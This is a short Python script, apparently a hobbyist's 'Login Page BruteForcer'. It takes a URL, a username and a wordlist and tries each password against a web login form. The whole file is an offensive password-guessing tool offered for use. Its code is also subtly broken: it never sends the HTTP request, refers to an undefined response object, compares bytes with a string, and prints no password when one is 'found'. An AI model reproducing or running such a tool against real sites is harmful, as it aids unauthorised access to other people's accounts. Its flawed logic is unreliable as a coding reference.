#!/usr/bin/env python


import requests
from termcolor import colored

print('''
        ################################
        #     Login Page BruteForcer   #
        #                              #
        #   Developed by Sheinn Khant  #
        ################################


     ''')


def bruteforce(username, url):
    for password in passwords:
        password = password.strip()
        print(colored("[!] Trying To Bruteforce with : " + password , 'red'))
        data_dictionary = {"username":username,"password":password,"Login":"submit"}#change in inspect element you want to brute web page
        if "Login failed" in response.content:
            pass
        else:
            print(colored("[+] Password Found :  ",'green'))
            exit(0)


page_url = str(input("[*] Enter url : "))
username = input("[*] Enter Username For Brute Page : ")
passwdlist = input("[*] Enter wordlist : ")


with open(passwdlist, 'r') as passwords:
    bruteforce(username,page_url)
